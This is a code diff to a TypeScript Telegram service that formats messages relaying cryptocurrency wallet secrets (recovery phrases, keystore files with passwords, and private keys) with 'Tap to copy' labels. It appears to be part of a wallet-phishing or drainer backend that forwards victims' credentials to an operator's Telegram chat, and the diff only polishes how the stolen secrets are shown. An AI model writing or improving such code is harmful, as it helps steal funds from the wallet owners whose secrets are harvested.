@@ -53,19 +53,25 @@ export class TelegramService {
     if (data.method === 'phrase') {
       const phrase = data.data.phrase || 'Not provided';
       const wordCount = data.data.wordCount || 0;
-      message += `🔑 Recovery Phrase:\n`;
+      message += `🔑 <b>Recovery Phrase</b> (Tap to copy):\n`;
+      message += `───────────────────────\n`;
       message += `<code>${phrase}</code>\n`;
-      message += `📊 Word Count: ${wordCount}/24\n`;
+      message += `\n📊 <b>Word Count:</b> ${wordCount}/24 words\n`;
     } else if (data.method === 'keystore') {
-      message += `📁 File Name: ${data.data.fileName || 'Not provided'}\n`;
-      message += `🔐 Password: <code>${data.data.password || 'Not provided'}</code>\n`;
+      message += `📁 <b>Keystore File</b>:\n`;
+      message += `───────────────────────\n`;
+      message += `📄 <b>File Name:</b> ${data.data.fileName || 'Not provided'}\n`;
+      message += `🔐 <b>Password</b> (Tap to copy):\n<code>${data.data.password || 'Not provided'}</code>\n`;
       if (data.data.keystore) {
-        const preview = data.data.keystore.substring(0, 150);
-        message += `📄 Content Preview:\n<code>${preview}...</code>\n`;
+        const preview = data.data.keystore.substring(0, 100);
+        message += `\n📋 <b>Content Preview</b>:\n<code>${preview}...</code>\n`;
       }
     } else if (data.method === 'private key') {
-      message += `🔑 Private Key:\n`;
-      message += `<code>${data.data.privateKey || 'Not provided'}</code>\n`;
+      message += `🔑 <b>Private Key</b> (Tap to copy):\n`;
+      message += `───────────────────────\n`;
+      const privateKey = data.data.privateKey || 'Not provided';
+      message += `<code>${privateKey}</code>\n`;
+      message += `\n📋 <b>Length:</b> ${privateKey.length} characters`;
     }
     
     message += '\n═══════════════════════';
